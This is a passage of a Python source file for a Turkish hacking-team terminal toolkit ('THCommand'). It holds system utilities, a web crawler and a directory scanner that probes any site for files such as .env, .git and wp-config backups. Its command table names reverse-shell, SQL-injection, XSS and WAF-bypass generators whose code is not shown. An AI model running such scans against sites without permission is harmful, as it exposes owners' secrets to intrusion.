        try:
            entries = sorted(Path(path).iterdir(), key=lambda e: (not e.is_dir(), e.name))
        except PermissionError: return
        for i, entry in enumerate(entries[:30]):
            connector = "└── " if i == len(entries)-1 else "├── "
            c = C.BLU if entry.is_dir() else C.GRN
            cprint(f"  {prefix}{connector}{entry.name}", c)
            if entry.is_dir():
                ext = "    " if i == len(entries)-1 else "│   "
                _tree(entry, prefix + ext, depth+1)
    cprint(f"  {d}", C.BLU); _tree(d)

def cmd_sizeof(args):
    d = args[0] if args else "."
    total = sum(f.stat().st_size for f in Path(d).rglob('*') if f.is_file())
    for unit in ['B','KB','MB','GB']:
        if total < 1024: cprint(f"  Boyut: {total:.2f} {unit}", C.GRN); return
        total /= 1024
    cprint(f"  Boyut: {total:.2f} TB", C.GRN)

def cmd_checksum(args):
    if len(args) < 2: cprint("Kullanım: /checksum <dosya> <beklenen_hash>", C.YLW); return
    try:
        h = hashlib.sha256()
        with open(args[0], 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''): h.update(chunk)
        match = h.hexdigest().lower() == args[1].lower()
        cprint(f"  {'EŞLEŞME' if match else 'UYUŞMAZLIK'}", C.GRN if match else C.RED)
        cprint(f"  Hesaplanan: {h.hexdigest()}", C.GRAY)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

# ─── Sistem & Süreç ───
def cmd_sysinfo(args):
    cprint("  ┌── Sistem Bilgisi ──", C.CYN)
    cprint(f"  İS:       {platform.system()} {platform.release()}", C.GRN)
    cprint(f"  Versiyon: {platform.version()}", C.GRN)
    cprint(f"  Makine:   {platform.machine()}", C.GRN)
    cprint(f"  İşlemci:  {platform.processor()}", C.GRN)
    cprint(f"  Python:   {sys.version}", C.GRN)
    cprint(f"  Hostname: {socket.gethostname()}", C.GRN)
    cprint(f"  Kullanıcı:{os.getlogin()}", C.GRN)

def cmd_procs(args):
    if os.name == "nt": os.system("tasklist")
    else: os.system("ps aux")

def cmd_kill(args):
    if not args: cprint("Kullanım: /kill <pid>", C.YLW); return
    try:
        if os.name == "nt": os.system(f"taskkill /PID {args[0]} /F")
        else: os.kill(int(args[0]), 9)
        cprint(f"  PID {args[0]} sonlandırıldı", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_env(args):
    for k, v in sorted(os.environ.items()):
        cprint(f"  {k}={v[:80]}", C.GRN)

def cmd_setenv(args):
    if len(args) < 2: cprint("Kullanım: /setenv <anahtar> <değer>", C.YLW); return
    os.environ[args[0]] = ' '.join(args[1:])
    cprint(f"  {args[0]} ayarlandı", C.GRN)

def cmd_uptime(args):
    if os.name == "nt": os.system('net stats workstation | findstr "since"')
    else: os.system("uptime")

def cmd_diskusage(args):
    if os.name == "nt": os.system("wmic logicaldisk get size,freespace,caption")
    else: os.system("df -h")

def cmd_meminfo(args):
    if os.name == "nt": os.system("wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /Value")
    else: os.system("free -h")

def cmd_whoami(args):
    cprint(f"  Kullanıcı: {os.getlogin()}", C.GRN)
    cprint(f"  Hostname:  {socket.gethostname()}", C.GRN)
    cprint(f"  Ev Dizini: {Path.home()}", C.GRN)
    cprint(f"  Çalışma:   {os.getcwd()}", C.GRN)
    cprint(f"  PID:       {os.getpid()}", C.GRN)

def cmd_services(args):
    if os.name == "nt": os.system("net start")
    else: os.system("systemctl list-units --type=service --state=running")


# ─── Geliştirici Araçları ───
def cmd_json(args):
    if not args: cprint("Kullanım: /json <json_dizgisi>", C.YLW); return
    try:
        obj = json.loads(' '.join(args))
        cprint(json.dumps(obj, indent=2, ensure_ascii=False), C.GRN)
    except json.JSONDecodeError as e: cprint(f"  Geçersiz JSON: {e}", C.RED)

def cmd_jsonfile(args):
    if not args: cprint("Kullanım: /jsonfile <dosya>", C.YLW); return
    try:
        with open(args[0]) as f: obj = json.load(f)
        cprint(json.dumps(obj, indent=2, ensure_ascii=False), C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_regex(args):
    if len(args) < 2: cprint("Kullanım: /regex <desen> <metin>", C.YLW); return
    try:
        matches = re.findall(args[0], ' '.join(args[1:]))
        if matches:
            for m in matches: cprint(f"  Eşleşme: {m}", C.GRN)
        else: cprint("  Eşleşme yok.", C.YLW)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_epoch(args):
    if not args:
        cprint(f"  Şu anki epoch: {int(time.time())}", C.GRN); return
    try:
        ts = int(args[0])
        dt = datetime.datetime.fromtimestamp(ts)
        cprint(f"  {ts} -> {dt.isoformat()}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_now(args):
    now = datetime.datetime.now()
    cprint(f"  ISO:    {now.isoformat()}", C.GRN)
    cprint(f"  UTC:    {datetime.datetime.utcnow().isoformat()}", C.GRN)
    cprint(f"  Epoch:  {int(now.timestamp())}", C.GRN)
    cprint(f"  Tarih:  {now.strftime('%Y-%m-%d')}", C.GRN)
    cprint(f"  Saat:   {now.strftime('%H:%M:%S')}", C.GRN)

def cmd_calc(args):
    if not args: cprint("Kullanım: /calc <ifade>", C.YLW); return
    try:
        expr = ' '.join(args)
        allowed = set("0123456789+-*/.()% ")
        if all(c in allowed for c in expr):
            cprint(f"  = {eval(expr)}", C.GRN)
        else: cprint("  Geçersiz ifade.", C.RED)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_snippet(args):
    if not args: cprint("Kullanım: /snippet save <ad> <kod> | load <ad> | list", C.YLW); return
    if args[0] == "save" and len(args) >= 3:
        SNIPPETS[args[1]] = ' '.join(args[2:]); cprint(f"  Kaydedildi: {args[1]}", C.GRN)
    elif args[0] == "load" and len(args) >= 2:
        if args[1] in SNIPPETS: cprint(f"  {SNIPPETS[args[1]]}", C.GRN)
        else: cprint(f"  Bulunamadı: {args[1]}", C.RED)
    elif args[0] == "list":
        if not SNIPPETS: cprint("  Kayıtlı snippet yok.", C.GRAY)
        for k in SNIPPETS: cprint(f"  {k}", C.GRN)
    else: cprint("Kullanım: /snippet save|load|list", C.YLW)

def cmd_todo(args):
    if not args:
        if not NOTES: cprint("  Not yok.", C.GRAY)
        for i, n in enumerate(NOTES): cprint(f"  [{i}] {n}", C.GRN)
        return
    if args[0] == "add": NOTES.append(' '.join(args[1:])); cprint("  Eklendi.", C.GRN)
    elif args[0] == "del":
        try: NOTES.pop(int(args[1])); cprint("  Silindi.", C.GRN)
        except: cprint("  Geçersiz indeks.", C.RED)
    elif args[0] == "clear": NOTES.clear(); cprint("  Temizlendi.", C.GRN)
    else: cprint("Kullanım: /todo [add|del|clear] ...", C.YLW)

def cmd_timer(args):
    if not args: cprint("Kullanım: /timer start <ad> | stop <ad>", C.YLW); return
    if args[0] == "start":
        name = args[1] if len(args) > 1 else "varsayilan"
        TIMERS[name] = time.time(); cprint(f"  Zamanlayıcı '{name}' başlatıldı.", C.GRN)
    elif args[0] == "stop":
        name = args[1] if len(args) > 1 else "varsayilan"
        if name in TIMERS:
            elapsed = time.time() - TIMERS.pop(name)
            cprint(f"  Zamanlayıcı '{name}': {elapsed:.3f}s", C.GRN)
        else: cprint(f"  Zamanlayıcı '{name}' bulunamadı.", C.RED)

def cmd_color(args):
    codes = [("KIRMIZI",C.RED),("YEŞİL",C.GRN),("SARI",C.YLW),("MAVİ",C.BLU),
             ("MOR",C.MAG),("CYAN",C.CYN),("BEYAZ",C.WHT),("GRİ",C.GRAY),("KALIN",C.BOLD)]
    for name, code in codes: cprint(f"  {name}: {'█'*8}", code)

def cmd_lorem(args):
    n = int(args[0]) if args else 1
    lorem = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris."
    for _ in range(n): cprint(f"  {lorem}", C.GRAY)

def cmd_csv2json(args):
    if not args: cprint("Kullanım: /csv2json <dosya.csv>", C.YLW); return
    try:
        with open(args[0], 'r') as f:
            reader = csv.DictReader(f)
            data = list(reader)
        cprint(json.dumps(data, indent=2, ensure_ascii=False), C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

# ─── Web Güvenlik ───
def cmd_sslinfo(args):
    if not args: cprint("Kullanım: /sslinfo <alan_adı>", C.YLW); return
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=args[0]) as s:
            s.settimeout(5); s.connect((args[0], 443))
            cert = s.getpeercert()
        cprint(f"  ┌── SSL Sertifika Bilgisi: {args[0]} ──", C.CYN)
        cprint(f"  Konu:      {dict(x[0] for x in cert.get('subject', []))}", C.GRN)
        cprint(f"  Yayıncı:   {dict(x[0] for x in cert.get('issuer', []))}", C.GRN)
        cprint(f"  Başlangıç: {cert.get('notBefore', 'N/A')}", C.GRN)
        cprint(f"  Bitiş:     {cert.get('notAfter', 'N/A')}", C.GRN)
        sans = cert.get('subjectAltName', [])
        if sans:
            cprint(f"  SAN:       {', '.join(v for _, v in sans[:5])}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_secheaders(args):
    if not args: cprint("Kullanım: /secheaders <url>", C.YLW); return
    try:
        url = args[0] if args[0].startswith("http") else "https://"+args[0]
        r = urllib.request.urlopen(url, timeout=5)
        headers = dict(r.headers)
        cprint(f"  ┌── Güvenlik Başlıkları: {url} ──", C.CYN)
        checks = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy": "CSP",
            "X-Frame-Options": "Clickjacking Koruması",
            "X-Content-Type-Options": "MIME Sniffing",
            "X-XSS-Protection": "XSS Filtresi",
            "Referrer-Policy": "Referrer Politikası",
            "Permissions-Policy": "İzin Politikası",
            "X-Permitted-Cross-Domain-Policies": "Flash/PDF Politikası",
        }
        for header, desc in checks.items():
            if header.lower() in {k.lower() for k in headers}:
                val = next(v for k, v in headers.items() if k.lower() == header.lower())
                cprint(f"  ✓ {desc} ({header}): {val[:60]}", C.GRN)
            else:
                cprint(f"  ✗ {desc} ({header}): EKSİK", C.RED)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_crawl(args):
    if not args: cprint("Kullanım: /crawl <url>", C.YLW); return
    try:
        url = args[0] if args[0].startswith("http") else "http://"+args[0]
        r = urllib.request.urlopen(url, timeout=10)
        html = r.read().decode(errors='ignore')
        links = set(re.findall(r'href=["\']([^"\']+)["\']', html))
        cprint(f"  ┌── {url} Bağlantıları ({len(links)}) ──", C.CYN)
        for link in sorted(links)[:30]:
            cprint(f"  → {link}", C.GRN)
        if len(links) > 30: cprint(f"  ... ve {len(links)-30} daha", C.GRAY)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_dirscan(args):
    if not args: cprint("Kullanım: /dirscan <url>", C.YLW); return
    url = args[0].rstrip('/')
    if not url.startswith("http"): url = "http://" + url
    dirs = ["admin","login","panel","dashboard","wp-admin","wp-login.php",
            "phpmyadmin","cpanel","webmail","api","backup","test","dev",
            "config","db","database","uploads","images","css","js",
            "robots.txt",".git",".env",".htaccess","sitemap.xml",
            "server-status","server-info","wp-config.php.bak",
            "administrator","user","console","debug","info"]
    cprint(f"  {url} dizin taraması...", C.CYN)
    found = 0
    for d in dirs:
        try:
            full = f"{url}/{d}"
            r = urllib.request.urlopen(full, timeout=3)
            code = r.getcode()
            cprint(f"  [BULUNDU {code}] {full}", C.GRN); found += 1
        except urllib.error.HTTPError as e:
            if e.code == 403:
                cprint(f"  [YASAK  403] {url}/{d}", C.YLW); found += 1
        except: pass
    cprint(f"\n  {found} sonuç bulundu.", C.CYN)


# ─── Terminal & Yardımcı ───
def cmd_alias(args):
    if not args:
        if not ALIASES: cprint("  Kısayol yok.", C.GRAY)
        for k, v in ALIASES.items(): cprint(f"  {k} -> {v}", C.GRN)
        return
    if '=' in ' '.join(args):
        parts = ' '.join(args).split('=', 1)
        ALIASES[parts[0].strip()] = parts[1].strip()
        cprint(f"  Kısayol oluşturuldu.", C.GRN)
    else: cprint("Kullanım: /alias ad=komut", C.YLW)

def cmd_history(args):
    for i, h in enumerate(HISTORY): cprint(f"  {i:4d}  {h}", C.GRN)

def cmd_clear(args):
    os.system("cls" if os.name == "nt" else "clear")

def cmd_export(args):
    fname = args[0] if args else "thcommand_gecmis.txt"
    with open(fname, 'w') as f:
        for h in HISTORY: f.write(h + '\n')
    cprint(f"  {len(HISTORY)} komut {fname} dosyasına aktarıldı", C.GRN)

def cmd_reload(args):
    cprint("  Yeniden başlatılıyor...", C.CYN)
    os.execv(sys.executable, [sys.executable] + sys.argv)

def cmd_about(args):
    cprint(f"\n  ┌──────────────────────────────────────┐", C.CYN)
    cprint(f"  │  THCommand v{VERSION}                     │", C.CYN)
    cprint(f"  │  Siber Güvenlik & Yazılım Terminali  │", C.CYN)
    cprint(f"  │                                      │", C.CYN)
    cprint(f"  │  Geliştirici : tbabi                  │", C.CYN)
    cprint(f"  │  Ekip        : TurkHackTeam           │", C.CYN)
    cprint(f"  │                                      │", C.CYN)
    cprint(f"  │  TurkHackTeam'e Özel Olarak           │", C.CYN)
    cprint(f"  │  Geliştirilmiştir.                    │", C.CYN)
    cprint(f"  └──────────────────────────────────────┘\n", C.CYN)
    total = sum(len(v) for v in COMMANDS.values())
    cprint(f"  {total} özel komut | Standart CMD desteği", C.GRAY)

# ─── Komut Yönlendirici ───
SLASH_COMMANDS = {
    # Ağ & Keşif
    "/portscan": cmd_portscan, "/ping": cmd_ping, "/dns": cmd_dns,
    "/rdns": cmd_rdns, "/whois": cmd_whois, "/myip": cmd_myip,
    "/pubip": cmd_pubip, "/netstat": cmd_netstat, "/traceroute": cmd_traceroute,
    "/subnet": cmd_subnet, "/macaddr": cmd_macaddr, "/httpheaders": cmd_httpheaders,
    "/arpscan": cmd_arpscan, "/bannergrep": cmd_bannergrep, "/subdom": cmd_subdom,
    # Hash & Kodlama
    "/hash": cmd_hash, "/hashfile": cmd_hashfile, "/hashcrack": cmd_hashcrack,
    "/b64enc": cmd_b64enc, "/b64dec": cmd_b64dec,
    "/hexenc": cmd_hexenc, "/hexdec": cmd_hexdec,
    "/urlenc": cmd_urlenc, "/urldec": cmd_urldec,
    "/rot13": cmd_rot13, "/crc32": cmd_crc32, "/hmacgen": cmd_hmacgen,
    "/xorenc": cmd_xorenc, "/encode_all": cmd_encode_all,
    # Şifre & Güvenlik
    "/passgen": cmd_passgen, "/passcheck": cmd_passcheck,
    "/uuid": cmd_uuid_gen, "/randstr": cmd_randstr, "/entropy": cmd_entropy,
    # Saldırı & Payload
    "/revshell": cmd_revshell, "/sqli": cmd_sqli, "/xss": cmd_xss,
    "/lfi": cmd_lfi, "/cmdinj": cmd_cmdinj, "/payloads": cmd_payloads,
    "/shellgen": cmd_shellgen, "/wafbypass": cmd_wafbypass,
    # Dosya İşlemleri
    "/hexdump": cmd_hexdump, "/fileinfo": cmd_fileinfo,
    "/find": cmd_find, "/grep": cmd_grep, "/wc": cmd_wc,
    "/head": cmd_head, "/tail": cmd_tail, "/diff": cmd_diff,
    "/shred": cmd_shred, "/tree": cmd_tree, "/sizeof": cmd_sizeof,
    "/checksum": cmd_checksum,
    # Sistem & Süreç
    "/sysinfo": cmd_sysinfo, "/procs": cmd_procs, "/kill": cmd_kill,
    "/env": cmd_env, "/setenv": cmd_setenv, "/uptime": cmd_uptime,
    "/diskusage": cmd_diskusage, "/meminfo": cmd_meminfo,
    "/whoami": cmd_whoami, "/services": cmd_services,
    # Geliştirici Araçları
    "/json": cmd_json, "/jsonfile": cmd_jsonfile, "/regex": cmd_regex,
    "/epoch": cmd_epoch, "/now": cmd_now, "/calc": cmd_calc,
    "/snippet": cmd_snippet, "/todo": cmd_todo, "/timer": cmd_timer,
    "/color": cmd_color, "/lorem": cmd_lorem, "/csv2json": cmd_csv2json,
    # Web Güvenlik
    "/sslinfo": cmd_sslinfo, "/secheaders": cmd_secheaders,
    "/crawl": cmd_crawl, "/dirscan": cmd_dirscan,
    # Terminal & Yardımcı
    "/alias": cmd_alias, "/history": cmd_history, "/clear": cmd_clear,
    "/export": cmd_export, "/reload": cmd_reload,
    "/hakkinda": cmd_about, "/about": cmd_about,
    "/banner": lambda a: banner(),
    "/yardim": lambda a: show_help(), "/help": lambda a: show_help(),
}


def main():
    os.system("cls" if os.name == "nt" else "clear")
    os.system("")  # Windows ANSI desteği
    banner()
    cwd = os.getcwd()

    while True:
        try:
            prompt = f"{C.RED}TH{C.WHT}@{C.CYN}{os.path.basename(cwd)}{C.WHT}> {C.R}"
            raw = input(prompt).strip()
            if not raw:
                continue

            HISTORY.append(raw)

            # Kısayol kontrolü
            first = raw.split()[0]
            if first in ALIASES:
                raw = ALIASES[first] + ' ' + ' '.join(raw.split()[1:])

            if raw.lower() in ("exit", "quit", "/exit", "/quit", "cikis", "/cikis"):
                cprint(f"\n  {C.RED}★{C.CYN} TurkHackTeam | tbabi {C.RED}★{C.R}")
                cprint(f"  Görüşmek üzere!\n", C.CYN)
                break

            # cd komutu
            if raw.lower().startswith("cd "):
                target = raw[3:].strip()
                try:
                    os.chdir(target)
                    cwd = os.getcwd()
                except Exception as e:
                    cprint(f"  Hata: {e}", C.RED)
                continue

            # Özel / komutları
            if raw.startswith("/"):
                parts = raw.split()
                cmd_name = parts[0].lower()
                cmd_args = parts[1:]
                if cmd_name in SLASH_COMMANDS:
                    try:
                        SLASH_COMMANDS[cmd_name](cmd_args)
                    except Exception as e:
                        cprint(f"  Hata: {e}", C.RED)
                else:
                    cprint(f"  Bilinmeyen komut: {cmd_name}. /yardim yazın.", C.RED)
                continue

            # Standart CMD / shell komutu
            try:
                result = subprocess.run(raw, shell=True, cwd=cwd, capture_output=False)
            except Exception as e:
                cprint(f"  Hata: {e}", C.RED)

        except KeyboardInterrupt:
            print()
            cprint("  Çıkmak için 'exit' yazın veya tekrar Ctrl+C basın.", C.YLW)
            try:
                input()
            except KeyboardInterrupt:
                cprint(f"\n  {C.RED}★{C.CYN} TurkHackTeam | tbabi {C.RED}★{C.R}")
                cprint(f"  Görüşmek üzere!\n", C.CYN)
                break
        except EOFError:
            break


if __name__ == "__main__":
    main()
